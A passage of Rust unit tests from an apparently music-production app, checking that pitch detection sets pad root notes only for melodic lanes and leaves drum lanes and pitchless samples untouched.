        // a noisy pad detects nothing, and answering `None` there would leave a
        // melodic lane playing every note as sampled — monotone, which is worse
        // than the octave error this replaces.
        let base = preview_kit().expect("the shipped kit must load");
        let lent = base.pads[base.pad_for(Lane::Melody).unwrap()].root_note;

        let assigned = BTreeMap::from([(Lane::Melody, one_shot("chop.wav", 0.5))]);
        let kit = base.with_one_shots(&assigned);

        assert_eq!(
            kit.pads[kit.pad_for(Lane::Melody).unwrap()].root_note,
            lent,
            "a sample with no detectable pitch keeps the pad's own root"
        );
    }

    #[test]
    fn a_drum_lane_is_never_given_a_root_however_tuned_its_sample_is() {
        // ⛔ `pitch::applies_to`'s rule, reached through the kit: a root on a
        // kick makes the drum grid's hand-drawn hits transpose it, and a 110 Hz
        // kick is an ordinary kick rather than an instruction to do that.
        let base = preview_kit().expect("the shipped kit must load");
        let assigned = BTreeMap::from([(Lane::Kick, tone(110.0))]);
        let kit = base.with_one_shots(&assigned);

        assert_eq!(kit.pads[kit.pad_for(Lane::Kick).unwrap()].root_note, None);
    }

    #[test]
    fn detection_is_only_asked_of_the_lanes_that_can_use_an_answer() {
        // The gate is `applies_to`, and it is asked in `load` rather than after
        // the fact — a kit re-roll decodes a dozen files and an NSDF over half a
        // second each is real work on the loader thread.
        for lane in [
            Lane::Melody,
            Lane::Counter,
            Lane::Bass,
            Lane::Chords,
            Lane::Sub,
        ] {
            assert!(crate::audio::pitch::applies_to(lane), "{lane:?}");
        }
        for lane in [Lane::Kick, Lane::Snare, Lane::ClosedHat, Lane::Clap] {
            assert!(!crate::audio::pitch::applies_to(lane), "{lane:?}");
        }
    }
}
